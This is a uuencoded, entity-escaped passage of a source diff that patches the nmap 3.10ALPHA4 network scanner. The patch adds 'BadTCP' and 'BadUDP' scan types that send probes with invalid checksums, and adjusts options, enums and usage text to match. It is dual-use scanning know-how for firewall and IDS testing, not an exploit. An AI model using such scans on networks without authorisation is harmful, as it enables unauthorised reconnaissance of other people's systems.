M&lt;V4@;VYL&gt;2!O;F4@;V8@+7-!+&quot;`M8BP@+7-4+&quot;`M&lt;T8L(&quot;US22P@+7--+&quot;`M
M&lt;TXL(&quot;US4RP@+7-7+&quot;!A;F0@+7-8(BD[&quot;BL@(&amp;EF(&quot;AA8VMS8V%N*V)O=6YC
M97-C86XK8V]N;F5C=&#039;-C86XK9FEN&lt;V-A;BMI9&amp;QE&lt;V-A;BMM86EM;VYS8V%N
M*VYU;&amp;QS8V%N*W-Y;G-C86XK=VEN9&amp;]W&lt;V-A;BMX;6%S&lt;V-A;BMB861T8W!S
M8V%N(#X@,2D**R`@(&quot;!F871A;&quot;@B66]U(&#039;-P96-I9FEE9&quot;!M;W)E(&#039;1H86X@
M;VYE(&#039;1Y&lt;&amp;4@;V8@5$-0(&#039;-C86XN(&quot;!0;&amp;5A&lt;V4@8VAO;W-E(&amp;]N;&#039;D@;VYE
M(&amp;]F(&quot;US02P@+6(L(&quot;US5&quot;P@+7-&amp;+&quot;`M&lt;TDL(&quot;US32P@+7-.+&quot;`M&lt;U,L(&quot;US
M5RP@+7-8(&amp;%N9&quot;`M&lt;UHB*3L*(&quot;`@&quot;B`@(&amp;EF(&quot;AN=6UD96-O&gt;7,@/B`P(&quot;8F
M(&quot;AB;W5N8V5S8V%N(&#039;Q\(&amp;-O;FYE8W1S8V%N*2D@&gt;PH@(&quot;`@(&amp;5R&lt;F]R*&quot;)7
M05).24Y&#039;.B!$96-O&gt;7,@87)E(&amp;ER&lt;F5L979A;G0@=&amp;\@=&amp;AE(&amp;)O=6YC92!O
M&lt;B!C;VYN96-T(&#039;-C86YS(BD[&quot;B`@(&#039;T*(&quot;`@&quot;BT@(&amp;EF(&quot;AF&lt;F%G&lt;V-A;B`F
M)B`A*&amp;%C:W-C86Y\9FEN&lt;V-A;GQM86EM;VYS8V%N?&amp;YU;&amp;QS8V%N?&#039;-Y;G-C
M86Y\=VEN9&amp;]W&lt;V-A;GQX;6%S&lt;V-A;BDI(&#039;L*+2`@(&quot;!F871A;&quot;@B1G)A9W-C
M86X@;VYL&gt;2!W;W)K&lt;R!W:71H($%#2RP@1DE.+&quot;!-86EM;VXL($Y53$PL(%-9
M3BP@5VEN9&amp;]W+&quot;!A;F0@6$U!4R!S8V%N(&#039;1Y&lt;&amp;5S(BD[&quot;BL@(&amp;EF(&quot;AF&lt;F%G
M&lt;V-A;B`F)B`A*&amp;%C:W-C86Y\9FEN&lt;V-A;GQM86EM;VYS8V%N?&amp;YU;&amp;QS8V%N
M?&#039;-Y;G-C86Y\=VEN9&amp;]W&lt;V-A;GQX;6%S&lt;V-A;GQB861T8W!S8V%N*2D@&gt;PHK
M(&quot;`@(&amp;9A=&amp;%L*&quot;)&amp;&lt;F%G&lt;V-A;B!O;FQY(&#039;=O&lt;FMS(&#039;=I=&amp;@@04-++&quot;!&amp;24XL
M($UA:6UO;BP@3E5,3&quot;P@4UE.+&quot;!7:6YD;W&lt;L(%A-05,@86YD($)A9%1#4&quot;!S
M8V%N(&#039;1Y&lt;&amp;5S(BD[&quot;B`@(&#039;T*(&quot;`@&quot;B`@(&amp;EF(&quot;AI9&amp;5N=&#039;-C86X@)B8@(6-O
M;FYE8W1S8V%N*2![&quot;D!`(&quot;TR.3DL-R`K,S`P+#D@0$`*(&quot;`@(&quot;!F871A;&quot;@B
M+2UM:6Y?&lt;&amp;%R86QL96QI&lt;VT@;75S=&quot;!B92!L97-S(&#039;1H86X@;W(@97%U86P@
M=&amp;\@+2UM87A?&lt;&amp;%R86QL96QI&lt;VTB*3L*(&quot;`@?0H@(&quot;`*+2`@:68@*&amp;%F*&quot;D@
M/3T@049?24Y%5#8@)B8@*&amp;YU;61E8V]Y&lt;WQO&lt;W-C86Y\8F]U;F-E&lt;V-A;GQF
M&lt;F%G&lt;V-A;GQA8VMS8V%N?&amp;9I;G-C86Y\:61L97-C86Y\:7!P&lt;F]T&lt;V-A;GQM
M86EM;VYS8V%N?&amp;YU;&amp;QS8V%N?&#039;)P8W-C86Y\&lt;WEN&lt;V-A;GQU9&#039;!S8V%N?&#039;=I
M;F1O=W-C86Y\&gt;&amp;UA&lt;W-C86XI*2![&quot;BL@(&amp;EF(&quot;AA9B@I(#T]($%&amp;7TE.150V
M(&quot;8F&quot;BL@&quot;BLH;G5M9&amp;5C;WES?&amp;]S&lt;V-A;GQB;W5N8V5S8V%N?&amp;9R86=S8V%N
M?&amp;%C:W-C86Y\9FEN&lt;V-A;GQI9&amp;QE&lt;V-A;GQI&lt;&#039;!R;W1S8V%N?&amp;UA:6UO;G-C
M86Y\;G5L;&#039;-C86Y\&lt;G!C&lt;V-A;GQS&gt;6YS8V%N?&#039;5D&lt;&#039;-C86Y\8F%D=61P&lt;V-A
M;GQW:6YD;W=S8V%N?&#039;AM87-S8V%N?&amp;)A9&#039;1C&lt;&#039;-C86XI*2![&quot;B`@(&quot;`@9F%T
M86PH(E-O&lt;G)Y(&quot;TM($E0=C8@&lt;W5P&lt;&amp;]R=&quot;!I&lt;R!C=7)R96YT;&#039;D@;VYL&gt;2!A
M=F%I;&amp;%B;&amp;4@9F]R(&amp;-O;FYE8W0H*2!S8V%N(&quot;@M&lt;U0I+&quot;!P:6YG(&#039;-C86X@
M*&quot;US4&quot;DL(&amp;%N9&quot;!L:7-T(&#039;-C86X@*&quot;US3&quot;DN(&quot;!)9B!Y;W4@=V%N=&quot;!B971T
M97(@25!V-B!S=7!P;W)T+&quot;!S96YD(&#039;EO=7(@&lt;F5Q=65S=&quot;!T;R!F&gt;6]D;W)`
M:6YS96-U&lt;F4N;W)G(&#039;-O(&amp;AE(&amp;-A;B!G=6%G92!D96UA;F0N(BD[&quot;B`@(&#039;T*
M(&#039;T*9&amp;EF9B`M=7).8B!N;6%P+3,N,3!!3%!(030O3FUA&lt;$]P&lt;RYH(&amp;YM87`M
M,RXQ,$%,4$A!-&quot;UB860O3FUA&lt;$]P&lt;RYH&quot;BTM+2!N;6%P+3,N,3!!3%!(030O
M3FUA&lt;$]P&lt;RYH&quot;5=E9&quot;!/8W0@,C,@,#@Z-3$Z-3&lt;@,C`P,@HK*RL@;FUA&lt;&quot;TS
M+C$P04Q02$$T+6)A9&quot;].;6%P3W!S+F@)5&amp;AU($1E8R`Q,B`P-CHU,3HR-&quot;`R
M,#`R&quot;D!`(&quot;TY-&quot;PV(&quot;LY-&quot;PW($!`&quot;B`@(&quot;\J(%-C86X@=&amp;EM:6YG+W!O;&amp;ET
M96YE&lt;W,@:7-S=65S(&quot;HO&quot;B`@(&amp;EN=&quot;!M87A?&lt;&amp;%R86QL96QI&lt;VT[(&quot;\O(#`@
M;65A;G,@:70@:&amp;%S(&amp;YO=&quot;!B965N(&#039;-E=`H@(&quot;!I;G0@;6EN7W!A&lt;F%L;&amp;5L
M:7-M.R`O+R`P(&amp;UE86YS(&amp;ET(&amp;AA&lt;R!N;W0@8F5E;B!S970**R`@:6YT(&amp;)A
M9&amp;-K&lt;W5M.PH@(&quot;!I;G0@;6%X7W)T=%]T:6UE;W5T.PH@(&quot;!I;G0@;6EN7W)T
M=%]T:6UE;W5T.PH@(&quot;!I;G0@:6YI=&amp;EA;%]R=&#039;1?=&amp;EM96]U=#L*0$`@+3$S
M-2PX(&quot;LQ,S8L,3`@0$`*(&quot;`@:6YT(&#039;)P8W-C86X[&quot;B`@(&amp;EN=&quot;!S&gt;6YS8V%N
M.PH@(&quot;!I;G0@=61P&lt;V-A;CL**R`@:6YT(&amp;)A9&#039;5D&lt;&#039;-C86X[&quot;B`@(&amp;EN=&quot;!W
M:6YD;W=S8V%N.PH@(&quot;!I;G0@&gt;&amp;UA&lt;W-C86X[&quot;BL@(&amp;EN=&quot;!B861T8W!S8V%N
M.PH@(&quot;!I;G0@;F]R97-O;&#039;9E.PH@(&quot;!I;G0@9F]R8V4[(&quot;\J(&amp;9O&lt;F-E(&amp;YM
M87`@=&amp;\@8V]N=&amp;EN=64@;VX@979E;B!W:&amp;5N(&#039;1H92!O=71C;VUE(&#039;-E96US
M(&#039;-O;65W:&amp;%T(&amp;-E&lt;G1A:6X@*B\*(&quot;`@:6YT(&amp;%P&lt;&amp;5N9%]O=71P=70[(&quot;\J
M($%P&lt;&amp;5N9&quot;!T;R!A;GD@;W5T&lt;&#039;5T(&amp;9I;&amp;5S(&#039;)A=&amp;AE&lt;B!T:&amp;%N(&amp;]V97)W
M&lt;FET92`J+PID:69F(&quot;UU&lt;DYB(&amp;YM87`M,RXQ,$%,4$A!-&quot;]G;&amp;]B86Q?&lt;W1R
M=6-T=7)E&lt;RYH(&amp;YM87`M,RXQ,$%,4$A!-&quot;UB860O9VQO8F%L7W-T&lt;G5C=&#039;5R
M97,N:`HM+2T@;FUA&lt;&quot;TS+C$P04Q02$$T+V=L;V)A;%]S=&#039;)U8W1U&lt;F5S+F@)
M36]N(%-E&lt;&quot;`Q-B`P,SHT-3HU.&quot;`R,#`R&quot;BLK*R!N;6%P+3,N,3!!3%!(030M
M8F%D+V=L;V)A;%]S=&#039;)U8W1U&lt;F5S+F@)5&amp;AU($1E8R`Q,B`P-SHP,3HT,R`R
M,#`R&quot;D!`(&quot;TQ.#$L-B`K,3@Q+#8@0$`*(&#039;T[&quot;B`*(`HM=&#039;EP961E9B!E;G5M
M(&#039;L@04-+7U-#04XL(%-93E]30T%.+&quot;!&amp;24Y?4T-!3BP@6$U!4U]30T%.+&quot;!5
M1%!?4T-!3BP@0T].3D5#5%]30T%.+&quot;!.54Q,7U-#04XL(%=)3D1/5U]30T%.
M+&quot;!24$-?4T-!3BP@34%)34].7U-#04XL($E04%)/5%]30T%.(&#039;T@&lt;W1Y&lt;&amp;4[
M&quot;BMT&gt;7!E9&amp;5F(&amp;5N=6T@&gt;R!!0TM?4T-!3BP@4UE.7U-#04XL($9)3E]30T%.
M+&quot;!834%37U-#04XL(%5$4%]30T%.+&quot;!#3TY.14-47U-#04XL($Y53$Q?4T-!
M3BP@5TE.1$]77U-#04XL(%)00U]30T%.+&quot;!-04E-3TY?4T-!3BP@25!04D]4
M7U-#04XL($)!1%1#4%]30T%.+&quot;!&quot;04151%!?4T-!3B!](&#039;-T&gt;7!E.PH@&quot;B`C
M96YD:68@+RI&#039;3$]&quot;04Q?4U1254-455)%4U]((&quot;HO&quot;F1I9F8@+75R3F(@;FUA
M&lt;&quot;TS+C$P04Q02$$T+VYM87`N8V,@;FUA&lt;&quot;TS+C$P04Q02$$T+6)A9&quot;]N;6%P
M+F-C&quot;BTM+2!N;6%P+3,N,3!!3%!(030O;FUA&lt;&quot;YC8PE-;VX@3F]V(#$Q(#$X
M.C`S.C4V(#(P,#(**RLK(&amp;YM87`M,RXQ,$%,4$A!-&quot;UB860O;FUA&lt;&quot;YC8PE4
M:&#039;4@1&amp;5C(#$R(#`Y.C`T.C0Y(#(P,#(*0$`@+34Q,RPW(&quot;LU,3,L-R!`0`H@
M(&quot;`@(&quot;`@8G)E86L[&quot;B`@(&quot;`@8V%S92`G&lt;R&lt;Z(`H@(&quot;`@(&quot;`@:68@*&quot;$J;W!T
M87)G*2![&quot;BT)9G!R:6YT9BAS=&amp;1E&lt;G(L(&quot;)!;B!O&lt;&#039;1I;VX@:7,@&lt;F5Q=6ER
M960@9F]R(&quot;US+&quot;!M;W-T(&amp;-O;6UO;B!A&lt;F4@+7-4(&quot;AT8W`@&lt;V-A;BDL(&quot;US
M4R`H4UE.(&#039;-C86XI+&quot;`M&lt;T8@*$9)3B!S8V%N*2P@+7-5(&quot;A51%`@&lt;V-A;BD@
M86YD(&quot;US4&quot;`H4&amp;EN9R!S8V%N*2(I.PHK&quot;69P&lt;FEN=&amp;8H&lt;W1D97)R+&quot;`B06X@
M;W!T:6]N(&amp;ES(&#039;)E&lt;75I&lt;F5D(&amp;9O&lt;B`M&lt;RP@;6]S=&quot;!C;VUM;VX@87)E(&quot;US
M5&quot;`H=&amp;-P(&#039;-C86XI+&quot;`M&lt;U,@*%-93B!S8V%N*2P@+7-:(&quot;A&quot;86140U`@&lt;V-A
M;BDL(&quot;US1B`H1DE.(&#039;-C86XI+&quot;`M&lt;U4@*%5$4&quot;!S8V%N*2P@+7-6(&quot;A&quot;8615
M1%`@&lt;V-A;BD@86YD(&quot;US4&quot;`H4&amp;EN9R!S8V%N*2(I.PH@&quot;7!R:6YT=7-A9V4H
M87)G=ELP72P@+3$I.PH@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@&lt;&quot;`](&amp;]P=&amp;%R9SL*0$`@
M+34S-2PW(&quot;LU,S4L.2!`0`H@&quot;6-A&lt;V4@)U4G.B`@&quot;B`)(&quot;!O+G5D&lt;&#039;-C86XK
M*SL*(`D@(&amp;)R96%K.PHK&quot;6-A&lt;V4@)U8G.B`@;RYB861U9&#039;!S8V%N*RL[(&amp;\N
M8F%D8VMS=6T@/2`Q.R!O+G!I;F=T&gt;7!E(#T@4$E.1U194$5?3D].13L@8G)E
M86L[(`H@&quot;6-A&lt;V4@)U@G.B`@;RYX;6%S&lt;V-A;BLK.V)R96%K.PHK&quot;6-A&lt;V4@
M)UHG.B`@;RYB861T8W!S8V%N(#T@,3L@;RYB861C:W-U;2`](#$[(&amp;\N&lt;&amp;EN
M9W1Y&lt;&amp;4@/2!024Y&#039;5%E015].3TY%.R!B&lt;F5A:SL*(`ED969A=6QT.B`@97)R
M;W(H(E-C86YT&gt;7!E(&quot;5C(&amp;YO=&quot;!S=7!P;W)T961&lt;;B(L*G`I.R!P&lt;FEN=&#039;5S
M86=E*&amp;%R9W9;,%TL(&quot;TQ*3L@8G)E86L[&quot;B`)?0H@&quot;7`K*SL*0$`@+3&lt;Q-BPW
M(&quot;LW,3@L-R!`0`H@(&quot;`O*B!&quot;969O&lt;F4@=V4@&lt;F%N9&amp;]M:7IE(&#039;1H92!P;W)T
M&lt;R!S8V%N;F5D+&quot;!L971S(&amp;]U=&#039;!U=&quot;!T:&amp;5M(&#039;1O(&amp;UA8VAI;F4@&quot;B`@(&quot;`@
M(&#039;!A&lt;G-E86)L92!O=71P=70@*B\*(&quot;`@:68@*&amp;\N=F5R8F]S92D*+2`@(&quot;`@
M;W5T&lt;&#039;5T7W!O&lt;G1S7W1O7VUA8VAI;F5?&lt;&amp;%R&lt;V5A8FQE7V]U=&#039;!U=&quot;AP;W)T
M&lt;RP@;RYW:6YD;W=S8V%N?&amp;\N&lt;WEN&lt;V-A;GQO+F-O;FYE8W1S8V%N?&amp;\N9G)A
M9W-C86Y\;RYF:6YS8V%N?&amp;\N;6%I;6]N&lt;V-A;GQO+F)O=6YC97-C86Y\;RYN
M=6QL&lt;V-A;GQO+GAM87-S8V%N?&amp;\N86-K&lt;V-A;GQO+FED;&amp;5S8V%N+&amp;\N=61P
M&lt;V-A;BQO+FEP&lt;&#039;)O=&#039;-C86XI.PHK(&quot;`@(&quot;!O=71P=71?&lt;&amp;]R=&#039;-?=&amp;]?;6%C
M:&amp;EN95]P87)S96%B;&amp;5?;W5T&lt;&#039;5T*&#039;!O&lt;G1S+&amp;\N=VEN9&amp;]W&lt;V-A;GQO+G-Y
M;G-C86Y\;RYC;VYN96-T&lt;V-A;GQO+F9R86=S8V%N?&amp;\N9FEN&lt;V-A;GQO+FUA
M:6UO;G-C86Y\;RYB;W5N8V5S8V%N?&amp;\N;G5L;&#039;-C86Y\;RYX;6%S&lt;V-A;GQO
M+F%C:W-C86Y\;RYI9&amp;QE&lt;V-A;GQO+F)A9&#039;1C&lt;&#039;-C86XL;RYU9&#039;!S8V%N?&amp;\N
M8F%D=61P&lt;V-A;BQO+FEP&lt;&#039;)O=&#039;-C86XI.PH@&quot;B`@(&quot;\J(&amp;UO&lt;F4@9F%K96%R
M9W8@:G5N:RP@0E17(&amp;UA;&amp;QO8R=I;F&lt;@97AT&lt;F$@&lt;W!A8V4@:6X@87)G=ELP
M72!D;V5S;B=T(&#039;=O&lt;FL@*B\*(&quot;`@:68@*&#039;%U87-H87)G=BD@&gt;PI`0&quot;`M.#$U
M+#&lt;@*S@Q-RPW($!`&quot;B`@(&quot;`@(&quot;!I9B`H8W5R&lt;F5N=&amp;AS+3YF;&amp;%G&lt;R`F($A/
M4U1?55`@+RHF)B`A8W5R&lt;F5N=&amp;AS+3YW:65R9%]R97-P;VYS97,J+R`F)@H@
M&quot;2`@(6\N&lt;&amp;EN9W-C86X@)B8@(6\N;&amp;ES=&#039;-C86XI(&#039;L*(`D*+0EI9B`H*&amp;-U
M&lt;G)E;G1H&lt;RT^9FQA9W,@)B!(3U-47U50*2`F)B!O+F%F*&quot;D@/3T@049?24Y%
M5&quot;`F)B!C=7)R96YT:&#039;,M/E-O=7)C95-O8VM!9&amp;1R*$Y53$PL($Y53$PI(&quot;$]
M(#`@)B8@*&quot;!O+G=I;F1O=W-C86X@?&#039;P@;RYS&gt;6YS8V%N(&#039;Q\(&amp;\N:61L97-C
M86X@?&#039;P@;RYF:6YS8V%N(&#039;Q\(&amp;\N;6%I;6]N&lt;V-A;B!\?&quot;!O+G5D&lt;&#039;-C86X@
M?&#039;P@;RYN=6QL&lt;V-A;B!\?&quot;!O+GAM87-S8V%N(&#039;Q\(&amp;\N86-K&lt;V-A;B!\?&quot;!O
M+FEP&lt;&#039;)O=&#039;-C86X@?&#039;P@;RYO&lt;W-C86XI*2![&quot;BL):68@*&quot;AC=7)R96YT:&#039;,M
M/F9L86=S(&quot;8@2$]35%]54&quot;D@)B8@;RYA9B@I(#T]($%&amp;7TE.150@)B8@8W5R
M&lt;F5N=&amp;AS+3Y3;W5R8V53;V-K061D&lt;BA.54Q,+&quot;!.54Q,*2`A/2`P(&quot;8F(&quot;@@
M;RYW:6YD;W=S8V%N(&#039;Q\(&amp;\N&lt;WEN&lt;V-A;B!\?&quot;!O+FED;&amp;5S8V%N(&#039;Q\(&amp;\N
M9FEN&lt;V-A;B!\?&quot;!O+FUA:6UO;G-C86X@?&#039;P@;RYU9&#039;!S8V%N(&#039;Q\(&amp;\N8F%D
M=61P&lt;V-A;B!\?&quot;!O+FYU;&amp;QS8V%N(&#039;Q\(&amp;\N&gt;&amp;UA&lt;W-C86X@?&#039;P@;RYA8VMS
M8V%N(&#039;Q\(&amp;\N:7!P&lt;F]T&lt;V-A;B!\?&quot;!O+F]S&lt;V-A;B!\?&quot;!O+F)A9&#039;1C&lt;&#039;-C
M86X@*2D@&gt;PH@&quot;2`@:68@*&amp;\N4V]U&lt;F-E4V]C:T%D9&#039;(H)G-S+&quot;`F&lt;W-L96XI
M(#T](#`I(&#039;L*(`D@(&quot;`@8W5R&lt;F5N=&amp;AS+3YS9713;W5R8V53;V-K061D&lt;B@F
M&lt;W,L(&#039;-S;&amp;5N*3L*(`D@(&#039;T@96QS92![&quot;2`@&quot;D!`(&quot;TX,S,L-R`K.#,U+#&lt;@
M0$`*(`E]&quot;B`)&quot;B`)+RH@1FEG=7)E(&amp;]U=&quot;!W:&amp;%T(&amp;QI;FLM;&amp;%Y97(@9&amp;5V
M:6-E(&quot;AI;G1E&lt;F9A8V4I(&#039;1O(&#039;5S92`H:64@971H,&quot;P@&lt;&#039;!P,&quot;P@971C*2`J
M+PHM&quot;6EF(&quot;@A*F-U&lt;G)E;G1H&lt;RT^9&amp;5V:6-E(&quot;8F(&amp;-U&lt;G)E;G1H&lt;RT^9FQA
M9W,@)B!(3U-47U50(&quot;8F(&quot;AO+FYU;&amp;QS8V%N(&#039;Q\(&amp;\N&gt;&amp;UA&lt;W-C86X@?&#039;P@
M;RYA8VMS8V%N(&#039;Q\(&amp;\N=61P&lt;V-A;B!\?&quot;!O+FED;&amp;5S8V%N(&#039;Q\(&amp;\N9FEN
M&lt;V-A;B!\?&quot;!O+FUA:6UO;G-C86X@?&#039;P@(&amp;\N&lt;WEN&lt;V-A;B!\?&quot;!O+F]S&lt;V-A
M;B!\?&quot;!O+G=I;F1O=W-C86X@?&#039;P@;RYI&lt;&#039;!R;W1S8V%N*2`F)B`H:7!A9&amp;1R
M,F1E=FYA;64H(&amp;-U&lt;G)E;G1H&lt;RT^9&amp;5V:6-E+&quot;!C=7)R96YT:&#039;,M/G8T&lt;V]U
M&lt;F-E:7`H*2D@(3T@,&quot;DI&quot;BL):68@*&quot;$J8W5R&lt;F5N=&amp;AS+3YD979I8V4@)B8@
M8W5R&lt;F5N=&amp;AS+3YF;&amp;%G&lt;R`F($A/4U1?55`@)B8@*&amp;\N;G5L;&#039;-C86X@?&#039;P@
M;RYX;6%S&lt;V-A;B!\?&quot;!O+F%C:W-C86X@?&#039;P@;RYU9&#039;!S8V%N(&#039;Q\(&amp;\N8F%D
M=61P&lt;V-A;B!\?&quot;!O+FED;&amp;5S8V%N(&#039;Q\(&amp;\N9FEN&lt;V-A;B!\?&quot;!O+FUA:6UO
M;G-C86X@?&#039;P@(&amp;\N&lt;WEN&lt;V-A;B!\?&quot;!O+F]S&lt;V-A;B!\?&quot;!O+G=I;F1O=W-C
M86X@?&#039;P@;RYI&lt;&#039;!R;W1S8V%N(&#039;Q\(&amp;\N8F%D=&amp;-P&lt;V-A;BD@)B8@*&amp;EP861D
M&lt;C)D979N86UE*&quot;!C=7)R96YT:&#039;,M/F1E=FEC92P@8W5R&lt;F5N=&amp;AS+3YV-&#039;-O
M=7)C96EP*&quot;DI(&quot;$](#`I*0H@&quot;2`@9F%T86PH(D-O=6QD(&amp;YO=&quot;!F:6=U&lt;F4@
M;W5T(&#039;=H870@9&amp;5V:6-E(&#039;1O(&#039;-E;F0@=&amp;AE(&#039;!A8VME=&quot;!O=70@;VXA(&quot;!9
M;W4@;6EG:&#039;0@&lt;&amp;]S&lt;VEB;&#039;D@=V%N=&quot;!T;R!T&lt;GD@+5,@*&amp;)U=&quot;!T:&amp;ES(&amp;ES
M(&#039;!R;V)A8FQY(&amp;$@8FEG9V5R(&#039;!R;V)L96TI+B`@268@&gt;6]U(&amp;%R92!T&lt;GEI
M;F&lt;@=&amp;\@&lt;W`P,&amp;8@=&amp;AE(&#039;-O=7)C92!O9B!A(%-93B]&amp;24X@&lt;V-A;B!W:71H
M(&quot;U3(#QF86ME:7`^+&quot;!T:&amp;5N(&#039;EO=2!M=7-T(&#039;5S92`M92!E=&amp;@P(&quot;AO&lt;B!O
M=&amp;AE&lt;B!D979I8V5N86UE*2!T;R!T96QL(&#039;5S(&#039;=H870@:6YT97)F86-E(&#039;1O
M(&#039;5S92Y&lt;;B(I.PH@&quot;2\J(%-E=&quot;!U&lt;&quot;!T:&amp;4@9&amp;5C;WD@*B\*(`EO+F1E8V]Y
M&lt;UMO+F1E8V]Y=&#039;5R;ET@/2!C=7)R96YT:&#039;,M/G8T&lt;V]U&lt;F-E*&quot;D[&quot;D!`(&quot;TX
M-#,L-B`K.#0U+#&lt;@0$`*(`EI9B`H;RYW:6YD;W=S8V%N*2!P;W-?&lt;V-A;BAC
M=7)R96YT:&#039;,L(&#039;!O&lt;G1S+3YT8W!?&lt;&amp;]R=&#039;,L(&#039;!O&lt;G1S+3YT8W!?8V]U;G0L
M(%=)3D1/5U]30T%.*3L*(`EI9B`H;RYC;VYN96-T&lt;V-A;BD@&lt;&amp;]S7W-C86XH
M8W5R&lt;F5N=&amp;AS+&quot;!P;W)T&lt;RT^=&amp;-P7W!O&lt;G1S+&quot;!P;W)T&lt;RT^=&amp;-P7V-O=6YT
M+&quot;!#3TY.14-47U-#04XI.PH@&quot;6EF(&quot;AO+F%C:W-C86XI(&#039;!O&lt;U]S8V%N*&amp;-U
M&lt;G)E;G1H&lt;RP@&lt;&amp;]R=&#039;,M/G1C&lt;%]P;W)T&lt;RP@&lt;&amp;]R=&#039;,M/G1C&lt;%]C;W5N=&quot;P@
M04-+7U-#04XI.R`**PEI9B`H;RYB861T8W!S8V%N*2!S=7!E&lt;E]S8V%N*&amp;-U
M&lt;G)E;G1H&lt;RP@&lt;&amp;]R=&#039;,M/G1C&lt;%]P;W)T&lt;RP@&lt;&amp;]R=&#039;,M/G1C&lt;%]C;W5N=&quot;P@
M0D%$5$-07U-#04XI.PH@&quot;6EF(&quot;AO+F9I;G-C86XI(&#039;-U&lt;&amp;5R7W-C86XH8W5R
M&lt;F5N=&amp;AS+&quot;!P;W)T&lt;RT^=&amp;-P7W!O&lt;G1S+&quot;!P;W)T&lt;RT^=&amp;-P7V-O=6YT+&quot;!&amp;
M24Y?4T-!3BD[&quot;B`):68@*&amp;\N&gt;&amp;UA&lt;W-C86XI(&#039;-U&lt;&amp;5R7W-C86XH8W5R&lt;F5N
M=&amp;AS+&quot;!P;W)T&lt;RT^=&amp;-P7W!O&lt;G1S+&quot;!P;W)T&lt;RT^=&amp;-P7V-O=6YT+&quot;!834%3
M7U-#04XI.PH@&quot;6EF(&quot;AO+FYU;&amp;QS8V%N*2!S=7!E&lt;E]S8V%N*&amp;-U&lt;G)E;G1H
M&lt;RP@&lt;&amp;]R=&#039;,M/G1C&lt;%]P;W)T&lt;RP@&lt;&amp;]R=&#039;,M/G1C&lt;%]C;W5N=&quot;P@3E5,3%]3
M0T%.*3L*0$`@+3@U,&quot;PV(&quot;LX-3,L-R!`0`H@&quot;0D)&quot;2`@(&quot;`@&lt;&amp;]R=&#039;,M/G1C
M&lt;%]C;W5N=&quot;P@34%)34].7U-#04XI.PH@&quot;6EF(&quot;AO+G5D&lt;&#039;-C86XI(&#039;-U&lt;&amp;5R
M7W-C86XH8W5R&lt;F5N=&amp;AS+&quot;!P;W)T&lt;RT^=61P7W!O&lt;G1S+&quot;`*(`D)&quot;0D@(&#039;!O
M&lt;G1S+3YU9&#039;!?8V]U;G0L(%5$4%]30T%.*3L**PEI9B`H;RYB861U9&#039;!S8V%N
M*2!S=7!E&lt;E]S8V%N*&amp;-U&lt;G)E;G1H&lt;RP@&lt;&amp;]R=&#039;,M/G5D&lt;%]P;W)T&lt;RP@&lt;&amp;]R
M=&#039;,M/G5D&lt;%]C;W5N=&quot;P@0D%$54107U-#04XI.PD)&quot;2`@&quot;B`):68@*&amp;\N:7!P
M&lt;F]T&lt;V-A;BD@&lt;W5P97)?&lt;V-A;BAC=7)R96YT:&#039;,L(&#039;!O&lt;G1S+3YP&lt;F]T&lt;RP@
M&quot;B`)&quot;0D)(&quot;`@(&quot;!P;W)T&lt;RT^&lt;&#039;)O=%]C;W5N=&quot;P@25!04D]47U-#04XI.PH@
M&quot;D!`(&quot;TQ,3DX+#@@*S$R,#(L,3`@0$`*(`D@(DYM87`@5BX@)7,@57-A9V4Z
M(&amp;YM87`@6U-C86X@5&#039;EP92AS*5T@6T]P=&amp;EO;G-=(#QH;W-T(&amp;]R(&amp;YE=&quot;!L
M:7-T/EQN(@H@&quot;2`B4V]M92!#;VUM;VX@4V-A;B!4&gt;7!E&lt;R`H)RHG(&amp;]P=&amp;EO
M;G,@&lt;F5Q=6ER92!R;V]T(&#039;!R:79I;&amp;5G97,I7&amp;XB&quot;B`)(&quot;(J(&quot;US4R!40U`@
M4UE.(&#039;-T96%L=&amp;@@&lt;&amp;]R=&quot;!S8V%N(&quot;AD969A=6QT(&amp;EF(&#039;!R:79I;&amp;5G960@
M*&#039;)O;W0I*5QN(@HK&quot;2`B*B`M&lt;UH@0F%D5$-0(%-93B!S=&amp;5A;&#039;1H(&#039;!O&lt;G0@
M&lt;V-A;EQN(@H@&quot;2`B(&quot;`M&lt;U0@5$-0(&amp;-O;FYE8W0H*2!P;W)T(&#039;-C86X@*&amp;1E
M9F%U;&#039;0@9F]R(&#039;5N&lt;&#039;)I=FEL96=E9&quot;!U&lt;V5R&lt;RE&lt;;B(*(`D@(BH@+7-5(%5$
M4&quot;!P;W)T(&#039;-C86Y&lt;;B(**PD@(BH@+7-6($)A9%5$4&quot;!P;W)T(&#039;-C86Y&lt;;B(*
M(`D@(B`@+7-0(&#039;!I;F&lt;@&lt;V-A;B`H1FEN9&quot;!A;GD@&lt;F5A8VAA8FQE(&amp;UA8VAI
M;F5S*5QN(@H@&quot;2`B*B`M&lt;T8L+7-8+&quot;US3B!3=&amp;5A;&#039;1H($9)3BP@6&amp;UA&lt;RP@
M;W(@3G5L;&quot;!S8V%N(&quot;AE&gt;&#039;!E&lt;G1S(&amp;]N;&#039;DI7&amp;XB&quot;B`)(&quot;(@(&quot;US4B\M22!2
M4$,O261E;G1D(&#039;-C86X@*&#039;5S92!W:71H(&amp;]T:&amp;5R(&#039;-C86X@=&#039;EP97,I7&amp;XB
M&quot;D!`(&quot;TQ-#&lt;V+#@@*S$T.#(L,3`@0$`*(&quot;`@8V%S92!!0TM?4T-!3CH@&lt;F5T
M=7)N(&quot;)!0TL@4V-A;B([(&amp;)R96%K.PH@(&quot;!C87-E(%-93E]30T%..B!R971U
M&lt;FX@(E-93B!3=&amp;5A;&#039;1H(%-C86XB.R!B&lt;F5A:SL*(&quot;`@8V%S92!&amp;24Y?4T-!
M3CH@&lt;F5T=7)N(&quot;)&amp;24X@4V-A;B([(&amp;)R96%K.PHK(&quot;!C87-E($)!1%1#4%]3
M0T%..B!R971U&lt;FX@(D)A9%1#4&quot;!38V%N(CL@8G)E86L[&quot;B`@(&amp;-A&lt;V4@6$U!
M4U]30T%..B!R971U&lt;FX@(EA-05,@4V-A;B([(&amp;)R96%K.PH@(&quot;!C87-E(%5$
M4%]30T%..B!R971U&lt;FX@(E5$4&quot;!38V%N(CL@8G)E86L[&quot;BL@(&amp;-A&lt;V4@0D%$
M54107U-#04XZ(&#039;)E=&#039;5R;B`B0F%D5410(%-C86XB.R!B&lt;F5A:SL*(&quot;`@8V%S
M92!#3TY.14-47U-#04XZ(&#039;)E=&#039;5R;B`B0V]N;F5C=&quot;@I(%-C86XB.R!B&lt;F5A
M:SL*(&quot;`@8V%S92!.54Q,7U-#04XZ(&#039;)E=&#039;5R;B`B3E5,3&quot;!38V%N(CL@8G)E
